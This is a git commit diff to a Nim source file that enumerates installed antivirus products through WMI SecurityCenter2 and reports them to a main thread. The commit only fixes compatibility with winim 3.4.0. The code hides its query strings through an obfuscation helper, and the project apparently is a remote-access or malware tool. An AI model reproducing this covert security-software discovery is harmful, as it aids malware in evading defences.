2a10f94838ab5e6b6fd1535f0f7d9eeaafdb2033
vieru <mixerandr3w001@gmail.com>
2020-08-11 13:23:38 +0300

    am reparat asta pt winim 3.4.0

--- src/lib/threads/getAVSThread.nim
+++ src/lib/threads/getAVSThread.nim
@@ -3,7 +3,7 @@ from winim/com import variantConverterToString
 from winim/com import items
 from winim/com import GetObject
 from winim/com import `.`
-from winim/com import `.()`
+from winim/com import get
 
 import ../functions/hideString
 
@@ -13,7 +13,7 @@ proc getAVS(): void =
   var wmi = GetObject d e"winmgmts:{impersonationLevel=impersonate}!\\.\root\SecurityCenter2"
 
   for av in wmi.execQuery d e"select * from AntivirusProduct":
-    mainThread.send "av: " & av.displayName
+    mainThread.send "av: " & $av.displayName
 
 proc initGetAVSThread*(): void {.thread.} =
   getAVS()
